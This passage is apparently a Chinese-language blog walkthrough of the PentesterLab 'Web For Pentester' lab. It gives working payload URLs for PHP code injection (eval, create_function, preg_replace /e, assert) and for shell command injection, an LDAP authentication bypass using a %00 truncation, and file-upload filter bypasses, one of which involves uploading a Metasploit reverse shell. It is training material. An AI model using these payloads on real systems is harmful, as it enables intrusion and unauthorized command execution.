<h3 id="Code-Injection"><a href="#Code-Injection" class="headerlink" title="Code Injection"></a>Code Injection</h3><h4 id="Code-Example-1"><a href="#Code-Example-1" class="headerlink" title="Code Example 1"></a>Code Example 1</h4><p>&#x8F93;&#x5165;&#x53CC;&#x5F15;&#x53F7;&#x62A5;&#x9519;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected <span class="string">&apos;!&apos;</span>, expecting <span class="string">&apos;,&apos;</span> <span class="keyword">or</span> <span class="string">&apos;;&apos;</span> in /<span class="keyword">var</span>/www/codeexec/example1.php(<span class="number">6</span>) : <span class="keyword">eval</span>()<span class="string">&apos;d code on line 1</span></span><br></pre></td></tr></table></figure>

<p>&#x63D0;&#x793A;&#x8F93;&#x5165;&#x6570;&#x636E;&#x5728; <code>eval()</code> &#x5185;&#xFF0C;&#x731C;&#x6D4B;&#x4EE3;&#x7801;&#x7ED3;&#x6784;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &apos;hello {$name} !!!&apos;;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>&#x6784;&#x9020; <code>$name = &quot;;system(&apos;id&apos;);&quot;</code>&#xFF0C;&#x95ED;&#x5408;&#x5355;&#x5F15;&#x53F7;&#x7ED5;&#x8FC7;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/codeexec/example1.php?name=%22;system(%27id%27);%22</span><br></pre></td></tr></table></figure>

<h4 id="Code-Example-2"><a href="#Code-Example-2" class="headerlink" title="Code Example 2"></a>Code Example 2</h4><p>&#x8F93;&#x5165;&#x5206;&#x53F7;&#x62A5;&#x9519;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected <span class="string">&apos;;&apos;</span>, expecting T_STRING <span class="keyword">or</span> T_VARIABLE <span class="keyword">or</span> <span class="string">&apos;{&apos;</span> <span class="keyword">or</span> <span class="string">&apos;$&apos;</span> in /<span class="keyword">var</span>/www/codeexec/example2.php(<span class="number">22</span>) : runtime-created <span class="function"><span class="keyword">function</span> <span class="title">on</span> <span class="title">line</span> 1</span></span><br><span class="line"><span class="function"><span class="title">Warning</span>: <span class="title">usort</span><span class="params">()</span> <span class="title">expects</span> <span class="title">parameter</span> 2 <span class="title">to</span> <span class="title">be</span> <span class="title">a</span> <span class="title">valid</span> <span class="title">callback</span>, <span class="title">no</span> <span class="title">array</span> <span class="title">or</span> <span class="title">string</span> <span class="title">given</span> <span class="title">in</span> /<span class="title">var</span>/<span class="title">www</span>/<span class="title">codeexec</span>/<span class="title">example2</span>.<span class="title">php</span> <span class="title">on</span> <span class="title">line</span> 22</span></span><br></pre></td></tr></table></figure>

<p>&#x4F7F;&#x7528;&#x4E86; <a href="https://www.php.net/manual/zh/function.usort.php" target="_blank" rel="noopener">usort()</a> &#x51FD;&#x6570;</p>
<blockquote>
<p>usort - &#x4F7F;&#x7528;&#x7528;&#x6237;&#x5B9A;&#x4E49;&#x7684;&#x6BD4;&#x8F83;&#x51FD;&#x6570;&#x5BF9;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x503C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;</p>
<p>&#x8BF4;&#x660E;&#xFF1A;<code>usort ( array &amp;$array , callable $value_compare_func ) : bool</code></p>
<p>&#x672C;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6BD4;&#x8F83;&#x51FD;&#x6570;&#x5BF9;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x503C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002; &#x5982;&#x679C;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x6570;&#x7EC4;&#x9700;&#x8981;&#x7528;&#x4E00;&#x79CD;&#x4E0D;&#x5BFB;&#x5E38;&#x7684;&#x6807;&#x51C6;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;&#x6B64;&#x51FD;&#x6570;</p>
</blockquote>
<p>&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F30;&#x8BA1;&#x7ED9;&#x5B9A;&#x4E86;&#xFF0C;&#x5BF9;&#x4E8E;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#x4E00;&#x70B9;&#x5934;&#x7EEA;&#x4E5F;&#x6CA1;&#x6709;&#x3002;&#x3002;&#x8FD8;&#x662F;&#x770B;&#x4E00;&#x6CE2;&#x6E90;&#x7801;&#x5427;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_5_1.png" alt="image-20200310152444617"></p>
<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x4E86; create_function() &#x51FD;&#x6570;&#xFF0C;&#x53C2;&#x9605;&#xFF1A;<a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4E0E;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x7684;&#x5C0F;&#x7ED3;</a> &#x4ECB;&#x7ECD;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; <code>}</code> &#x9003;&#x9038;&#x51FA;&#x533F;&#x540D;&#x51FD;&#x6570;&#x4EE3;&#x7801;&#x5757;&#x3002;&#x4E3E;&#x4E2A;&#x4E0D;&#x592A;&#x6070;&#x5F53;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x8BE5;&#x533F;&#x540D;&#x51FD;&#x6570;&#x76F8;&#x5F53;&#x4E8E;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">($a, $b)</span></span>{</span><br><span class="line">    <span class="keyword">return</span> strcmp($a-&gt;$order, $b-&gt;$order);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x6784;&#x9020; <code>$order=id,1);}system(&apos;id&apos;);//</code>&#xFF0C;&#x51FD;&#x6570;&#x7B49;&#x540C;&#x4E8E;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">($a, $b)</span></span>{</span><br><span class="line">    <span class="keyword">return</span> strcmp($a-&gt;id,<span class="number">1</span>);}system(<span class="string">&apos;id&apos;</span>);<span class="comment">//, $b-&gt;id,1);}system(&apos;id&apos;);//);</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/codeexec/example2.php?order=id,1);}system(%27id%27);//</span><br></pre></td></tr></table></figure>

<h4 id="Code-Example-3"><a href="#Code-Example-3" class="headerlink" title="Code Example 3"></a>Code Example 3</h4><p>&#x6D4B;&#x8BD5;&#x94FE;&#x63A5;&#xFF1A;</p>
<p><code>http://test.com/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer</code></p>
<p>&#x4E4D;&#x4E00;&#x770B;&#x5947;&#x5947;&#x602A;&#x602A;&#xFF0C;&#x968F;&#x624B;&#x6D4B;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x6709;&#x5F3A;&#x70C8;&#x7684;&#x611F;&#x89C9;&#x662F;&#x5728;&#x505A;&#x6B63;&#x5219;&#x5904;&#x7406;</p>
<p>&#x5E94;&#x8BE5;&#x662F; <code>preg_replace($pattern, $new, $base)</code> &#x6CA1;&#x8DD1;&#x4E86;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/codeexec/example3.php?new=system(&apos;id&apos;)&amp;pattern=/lamer/e&amp;base=Hello%20lamer</span><br></pre></td></tr></table></figure>

<h4 id="Code-Example-4"><a href="#Code-Example-4" class="headerlink" title="Code Example 4"></a>Code Example 4</h4><p>&#x5355;&#x5F15;&#x53F7;&#x62A5;&#x9519;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /<span class="keyword">var</span>/www/codeexec/example4.php(<span class="number">4</span>) : assert code on line <span class="number">1</span></span><br><span class="line">Catchable fatal error: assert(): Failure evaluating code:</span><br><span class="line"><span class="string">&apos;hacker&apos;</span><span class="string">&apos; in /var/www/codeexec/example4.php on line 4</span></span><br></pre></td></tr></table></figure>

<p>PHP 7 &#x4EE5;&#x4E0B;&#x7684;&#x65AD;&#x8A00;&#xFF0C;&#x4F1A;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x5F53;&#x505A; PHP &#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;&#x8FD9;&#x91CC;&#x95ED;&#x5408;&#x5355;&#x5F15;&#x53F7;&#x5373;&#x53EF;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/codeexec/example4.php?name=%27.system(%27id%27);%27</span><br></pre></td></tr></table></figure>

<h3 id="Commands-Injection"><a href="#Commands-Injection" class="headerlink" title="Commands Injection"></a>Commands Injection</h3><h4 id="Command-Example-1"><a href="#Command-Example-1" class="headerlink" title="Command Example 1"></a>Command Example 1</h4><p>&#x4F7F;&#x7528; <code>;</code> &#x5206;&#x9694;&#x8BED;&#x53E5;&#xFF0C;&#x6267;&#x884C;&#x591A;&#x6761;&#x547D;&#x4EE4;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/commandexec/example1.php?ip=127.0.0.1;id</span><br></pre></td></tr></table></figure>

<h4 id="Command-Example-2"><a href="#Command-Example-2" class="headerlink" title="Command Example 2"></a>Command Example 2</h4><p><code>%0a</code> &#x6362;&#x884C;&#x7B26;&#x7ED5;&#x8FC7;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/commandexec/example2.php?ip=127.0.0.1%0aid</span><br></pre></td></tr></table></figure>

<h4 id="Command-Example-3"><a href="#Command-Example-3" class="headerlink" title="Command Example 3"></a>Command Example 3</h4><p><code>;</code> &#x7ED5;&#x8FC7;&#xFF0C;&#x9875;&#x9762;&#x505A;&#x4E86;&#x4E00;&#x6B21; 302 &#x8DF3;&#x8F6C;&#xFF0C;&#x5728; Burp &#x91CC;&#x9762;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x547D;&#x4EE4;&#x56DE;&#x663E;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/commandexec/example3.php?ip=127.0.0.1;id</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_6_1.png" alt="image-20200310170947381"></p>
<h3 id="LDAP-Attacks"><a href="#LDAP-Attacks" class="headerlink" title="LDAP Attacks"></a>LDAP Attacks</h3><p>&#x5BF9;&#x8FD9;&#x7C7B;&#x6F0F;&#x6D1E;&#x4E0D;&#x592A;&#x4E86;&#x89E3;&#xFF0C;&#x770B;&#x6E90;&#x7801;&#xFF0C;&#x53C2;&#x9605; &#x201C;<a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">LDAP&#x6CE8;&#x5165;&#x4E0E;&#x9632;&#x5FA1;&#x5256;&#x6790;</a>&#x201C; &#x5B66;&#x4E60;&#x4E00;&#x6CE2;</p>
<p>&#x4F7F;&#x7528;&#x6700;&#x5E7F;&#x6CDB;&#x7684; LDAP &#x670D;&#x52A1;&#xFF1A;</p>
<ul>
<li>&#x5FAE;&#x8F6F; ADAM&#xFF08;Active Directory Application Mode&#xFF09;</li>
<li>OpenLDAP</li>
<li>&#x2026;&#x2026;</li>
</ul>
<blockquote>
<p><code>(attribute=value)</code>&#xFF1A;&#x5982;&#x679C;&#x8FC7;&#x6EE4;&#x5668;&#x7528;&#x4E8E;&#x6784;&#x9020;&#x67E5;&#x8BE2;&#x4F46;&#x7F3A;&#x5C11;&#x903B;&#x8F91;&#x64CD;&#x4F5C;&#x7B26;&#xFF0C;&#x5982; <code>value)(injected_filter</code> &#x7684;&#x6CE8;&#x5165;&#x4F1A;&#x5BFC;&#x81F4;&#x4E24;&#x4E2A;&#x8FC7;&#x6EE4;&#x5668; <code>(attribute=value)(injected\_filter)</code>&#x3002;&#x5728;OpenLDAP&#x5B9E;&#x65BD;&#x4E2D;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x8FC7;&#x6EE4;&#x5668;&#x4F1A;&#x88AB;&#x5FFD;&#x7565;&#xFF0C;&#x53EA;&#x6709;&#x7B2C;&#x4E00;&#x4E2A;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#x3002;&#x800C;&#x5728;ADAM&#x4E2D;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x8FC7;&#x6EE4;&#x5668;&#x7684;&#x67E5;&#x8BE2;&#x662F;&#x4E0D;&#x88AB;&#x5141;&#x8BB8;&#x7684;&#xFF0C;&#x56E0;&#x800C;&#x8FD9;&#x4E2A;&#x6CE8;&#x5165;&#x6BEB;&#x65E0;&#x7528;&#x5904;</p>
<p><code>(|(attribute=value)(second_filter)) or (&amp;(attribute=value)(second_filter))</code>&#xFF1A;&#x5982;&#x679C;&#x7B2C;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6784;&#x9020;&#x67E5;&#x8BE2;&#x7684;&#x8FC7;&#x6EE4;&#x5668;&#x6709;&#x903B;&#x8F91;&#x64CD;&#x4F5C;&#x7B26;&#xFF0C;&#x5F62;&#x5982; <code>value)(injected_filter)</code> &#x7684;&#x6CE8;&#x5165;&#x4F1A;&#x53D8;&#x6210;&#x5982;&#x4E0B;&#x8FC7;&#x6EE4;&#x5668;&#xFF1A;<code>(&amp;(attribute=value)(injected_filter)) (second_filter)</code>&#x3002;&#x867D;&#x7136;&#x8FC7;&#x6EE4;&#x5668;&#x8BED;&#x6CD5;&#x4E0A;&#x5E76;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;OpenLDAP&#x8FD8;&#x662F;&#x4F1A;&#x4ECE;&#x5DE6;&#x5230;&#x53F3;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5FFD;&#x7565;&#x7B2C;&#x4E00;&#x4E2A;&#x8FC7;&#x6EE4;&#x5668;&#x95ED;&#x5408;&#x540E;&#x7684;&#x4EFB;&#x4F55;&#x5B57;&#x7B26;&#x3002;&#x4E00;&#x4E9B;LDAP&#x5BA2;&#x6237;&#x7AEF;Web&#x7EC4;&#x6210;&#x4F1A;&#x5FFD;&#x7565;&#x7B2C;&#x4E8C;&#x4E2A;&#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x5C06;ADAM&#x548C;OpenLDAP&#x53D1;&#x9001;&#x7ED9;&#x7B2C;&#x4E00;&#x4E2A;&#x5B8C;&#x6210;&#x7684;&#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x56E0;&#x800C;&#x5B58;&#x5728;&#x6CE8;&#x5165;</p>
</blockquote>
<p>Attack Type&#xFF1A;</p>
<ul>
<li>AND &#x6CE8;&#x5165;</li>
<li>OR &#x6CE8;&#x5165;</li>
<li>LDAP &#x76F2;&#x6CE8;<ul>
<li>AND &#x76F2;&#x6CE8;</li>
<li>OR &#x76F2;&#x6CE8;</li>
</ul>
</li>
</ul>
<h4 id="LDAP-Example-1"><a href="#LDAP-Example-1" class="headerlink" title="LDAP Example 1"></a>LDAP Example 1</h4><p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_7_1.png" alt="image-20200310223302658"></p>
<p>&#x672A;&#x53D1;&#x73B0;&#x4F7F;&#x7528;&#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x4EE3;&#x7801;&#x671F;&#x671B; <code>pentesterlab.com</code> &#x57DF;&#x540D;&#x4E0B;<code>people</code> &#x5206;&#x652F;&#x7684;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#x767B;&#x5F55;</p>
<blockquote>
<p><a href="https://klionsec.github.io/2017/12/20/ldap-sec/" target="_blank" rel="noopener">&#x8BA4;&#x8BC6;ldap&#x4E2D;&#x5E38;&#x89C1;&#x7684;&#x4E00;&#x4E9B;&#x7F29;&#x5199;&#x5355;&#x8BCD;&#x542B;&#x4E49;</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;dn  &#x552F;&#x4E00;&#x6807;&#x793A;,&#x7C7B;&#x4F3C;linux&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;,&#x901A;&#x8FC7;dn&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x67E5;&#x627E;&#x5230;&#x76EE;&#x5F55;&#x4FE1;&#x606F;&#x6811;&#x4E2D;&#x7684;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x8282;&#x70B9;</span><br><span class="line">&gt;basedn&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x6240;&#x8BF4;&#x7684;&#x76EE;&#x5F55;&#x4FE1;&#x606F;&#x6811;&#x7684;&#x6839;,rdn &#x5219;&#x662F;&#x76F8;&#x5BF9;&#x6807;&#x793A;&#x540D;,&#x5373;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;</span><br><span class="line">&gt;dc  &#x4E00;&#x822C;&#x7528;&#x4E8E;&#x5C06;&#x5B8C;&#x6574;&#x57DF;&#x540D;&#x5212;&#x5206;&#x51E0;&#x90E8;&#x5206;,&#x5982;,rootkit.org&#x5C31;&#x4F1A;&#x88AB;&#x8868;&#x793A;&#x4E3A;`dc=rootkit,dc=org`</span><br><span class="line">&gt;uid &#x7528;&#x6237;id,&#x901A;&#x5E38;&#x6765;&#x6E90;&#x4E8E;/etc/passwd</span><br><span class="line">&gt;cn  &#x59D3;&#x540D;,&#x901A;&#x5E38;&#x6765;&#x6E90;&#x4E8E;/etc/group</span><br><span class="line">&gt;sn  &#x59D3;</span><br><span class="line">&gt;o   &#x7EC4;&#x7EC7;[&#x516C;&#x53F8;]&#x540D;&#x79F0;,&#x50CF;&#x8FD9;&#x4E9B;&#x53EA;&#x662F;&#x4ECE;&#x903B;&#x8F91;&#x4E0A;&#x5206;&#x5F00;</span><br><span class="line">&gt;ou  &#x5355;&#x4F4D;[&#x90E8;&#x95E8;]&#x540D;&#x79F0;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>&#x201C;<a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">LDAP&#x6CE8;&#x5165;&#x4E0E;&#x9632;&#x5FA1;&#x5256;&#x6790;</a>&#x201C; &#x8FD8;&#x63D0;&#x5230;&#x8FC7; LDAP &#x670D;&#x52A1;&#x5B58;&#x5728;&#x533F;&#x540D;&#x8BBF;&#x95EE;</p>
<p>&#x770B;&#x7F51;&#x4E0A; WriteUp &#x662F;&#x5C06;&#x9875;&#x9762;&#x53C2;&#x6570;&#x5220;&#x9664;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x6307;&#x5B9A;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#xFF0C;&#x5C06;&#x4F1A;&#x8FDB;&#x884C;&#x533F;&#x540D;&#x767B;&#x5F55;&#x3002;&#x8BBF;&#x95EE;&#x5982;&#x4E0B;&#x94FE;&#x63A5;&#x4F1A;&#x663E;&#x793A; AUTHENTICATED&#xFF08;&#x5DF2;&#x8BA4;&#x8BC1;&#xFF09;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/ldap/example1.php</span><br></pre></td></tr></table></figure>

<p>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; LDAPSoft LDAP Admin &#x76F4;&#x63A5;&#x533F;&#x540D;&#x767B;&#x5F55;&#xFF0C;&#x8C8C;&#x4F3C; LDAPSoft Ldap Browser &#x662F;&#x514D;&#x8D39;&#x7684;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_7_6.png" alt="image-20200311013944515"></p>
<h4 id="LDAP-Example-2"><a href="#LDAP-Example-2" class="headerlink" title="LDAP Example 2"></a>LDAP Example 2</h4><p><code>hacker</code> &#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#xFF0C;&#x5C1D;&#x8BD5;&#x83B7;&#x53D6;&#x66F4;&#x591A;&#x4FE1;&#x606F;</p>
<p>&#x5BF9;&#x4E8E;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x5904;&#x7684; LDAP &#x8BED;&#x53E5;&#x5E94;&#x5F53;&#x662F; AND &#x578B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(USER=Uname)(PASSWORD=Pwd))</span><br></pre></td></tr></table></figure>

<p>&#x5148;&#x5C1D;&#x8BD5;&#x7ED5;&#x8FC7;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#xFF0C;&#x6784;&#x9020; <code>name=hacker)(%26)&amp;password=hacker</code>&#xFF0C;&#x8FD4;&#x56DE;&#x62A5;&#x9519;&#x4FE1;&#x606F;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unable to search ldap server</span><br><span class="line">msg:&apos;Bad search filter&apos;</span><br></pre></td></tr></table></figure>

<p><del>&#x4F2A;&#x4EE3;&#x7801;&#x7ED3;&#x6784;&#x4E0D;&#x5BF9;</del>&#xFF0C;&#x9EBD;&#x5F97;&#x601D;&#x8DEF;&#x4E86;&#x3002;&#x3002;&#x592A;&#x83DC;&#x4E86;&#xFF0C;&#x6012;&#x770B;&#x6E90;&#x4EE3;&#x7801;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_7_2.png" alt="image-20200311002538722"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter = (&amp;(cn=hacker)(userPassword=MD5Pass))</span><br></pre></td></tr></table></figure>

<p><del>&#x6CA1;&#x95EE;&#x9898;&#x554A;</del>&#xFF0C;&#x51FA;&#x5927;&#x95EE;&#x9898;&#x4E86; </p>
<p>&#x4F9D;&#x7167;&#x7F51;&#x4E0A; WriteUp &#x4F7F;&#x7528; <code>%00</code> &#x622A;&#x65AD; Password &#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x6210;&#x529F;&#x7ED5;&#x8FC7;&#x9A8C;&#x8BC1;</p>
<p>&#x4F46;&#x662F;&#x53C2;&#x9605;&#x7684;&#x5E16;&#x5B50;&#x662F;&#x6709;&#x8D34;&#x5B9E;&#x4F8B;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5728;&#x7F51;&#x4E0A;&#x7FFB;&#x9605; WriteUp &#x65F6;&#x53D1;&#x73B0;&#xFF1A;&#x5B58;&#x5728;&#x4E0D;&#x7528; <code>%00</code> &#x622A;&#x65AD;&#xFF0C;&#x6210;&#x529F;&#x7ED5;&#x8FC7;&#x9A8C;&#x8BC1;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_7_3.png" alt="image-20200311010711363"></p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_7_4.png" alt="image-20200311010807265"></p>
<p>&#x597D;&#x5947;.ing &#x2026;.</p>
<p>&#x518D;&#x770B;&#x4E00;&#x4E0B;&#x53C2;&#x9605;&#x5E16;&#x5B50;&#x7ED9;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_7_5.png" alt="image-20200311010945280"></p>
<p><del>&#x5947;&#x5947;&#x602A;&#x602A;</del>&#xFF0C;&#x518D;&#x770B;&#x770B;&#x6211;&#x6D4B;&#x8BD5;&#x7684; Payload&#xFF1A;<code>name=hacker)(%26)&amp;password=hacker</code></p>
<p>&#x597D;&#x50CF;&#x6CA1;&#x5565;&#x4E0D;&#x5BF9;&#x7684;&#xFF0C;&#x7B49;&#x7B49;&#xFF0C;&#x4E0A;&#x9762;&#x4E09;&#x4E2A;&#x4F8B;&#x5B50;&#x4E2D;&#x6E05;&#x4E00;&#x8272;&#x4F7F;&#x7528;&#x4E86; <code>name=xx)(x))</code></p>
<p>&#x591A;&#x51FA;&#x6765;&#x7684;&#x4E00;&#x4E2A;&#x53CD;&#x62EC;&#x53F7;&#xFF0C;&#x5947;&#x5947;&#x602A;&#x602A;&#x3002;&#x53EA;&#x6709;&#x5728;&#x622A;&#x65AD;&#x540E;&#x9762; Password &#x65F6;&#xFF0C;&#x9700;&#x8981;&#x591A;&#x6DFB;&#x4E0A;&#x4E00;&#x4E2A;&#x53CD;&#x62EC;&#x53F7;</p>
<p>&#x597D;&#x561B;&#xFF0C;&#x7ED3;&#x8BBA;&#x51FA;&#x6765;&#x4E86;&#xFF1A;</p>
<p>&#x4EE5;&#x4E0A;&#x6587;&#x7AE0;&#x4E2D;&#x7684; Payload &#x90FD;&#x6CA1;&#x9519;&#xFF0C;&#x90FD;<strong>&#x4F7F;&#x7528;&#x4E86; <code>%00</code> &#x622A;&#x65AD;&#x540E;&#x4F4D;&#x8FC7;&#x6EE4;&#x5668;&#x3002;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x6587;&#x672C;&#x7F16;&#x8F91;  or &#x6D4F;&#x89C8;&#x5668;&#x663E;&#x793A;&#x539F;&#x56E0;&#xFF0C; <code>%00</code> &#x5728;&#x5B9E;&#x9645;&#x6E32;&#x67D3;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB; &#x201C;&#x9690;&#x85CF;&#x201D; &#x8D77;&#x6765;&#x4E86;</strong></p>
<p>&#x884C;&#x5427;&#xFF0C;&#x5E0C;&#x671B;&#x672C;&#x6C34;&#x6587;&#x7684; <code>%00</code> &#x4E0D;&#x4F1A;&#x88AB;&#x5403;&#x6389;</p>
<p>&#x56DE;&#x5230;&#x6B63;&#x9898;&#xFF0C;&#x6700;&#x7EC8; Payload &#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/ldap/example2.php?name=hacker))%00&amp;password=x</span><br></pre></td></tr></table></figure>

<p>&#x63A5;&#x4E0B;&#x6765;&#x5229;&#x7528; AND &#x76F2;&#x6CE8;&#x6280;&#x5DE7;&#x904D;&#x5386;&#x6240;&#x6709;&#x7528;&#x6237;&#x540D;&#x5373;&#x53EF;</p>
<h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><h4 id="File-Example-1-1"><a href="#File-Example-1-1" class="headerlink" title="File Example 1"></a>File Example 1</h4><p>&#x65E0;&#x4EFB;&#x4F55;&#x8FC7;&#x6EE4;&#xFF0C;&#x76F4;&#x63A5;&#x4E0A;&#x4F20; MSF &#x53CD;&#x5F39;&#x9A6C;&#xFF0C;&#x8BBF;&#x95EE;&#x6267;&#x884C;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_8_1.png" alt="image-20200310173032406"></p>
<h4 id="File-Example-2-1"><a href="#File-Example-2-1" class="headerlink" title="File Example 2"></a>File Example 2</h4><p>&#x8FC7;&#x6EE4; <code>php</code>&#xFF0C;&#x5927;&#x5C0F;&#x5199;&#x540E;&#x7F00;&#x7ED5;&#x8FC7;&#xFF1A;<code>.Php</code></p>
<h3 id="XML-Attacks"><a href="#XML-Attacks" class="headerlink" title="XML Attacks"></a>XML Attacks</h3><h4 id="XML-Example-1"><a href="#XML-Example-1" class="headerlink" title="XML Example 1"></a>XML Example 1</h4><p>&#x6709;&#x56DE;&#x663E;&#xFF0C;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x8FC7;&#x6EE4;&#xFF0C;&#x76F4;&#x63A5;&#x8BFB;&#x654F;&#x611F;&#x6587;&#x4EF6;</p>
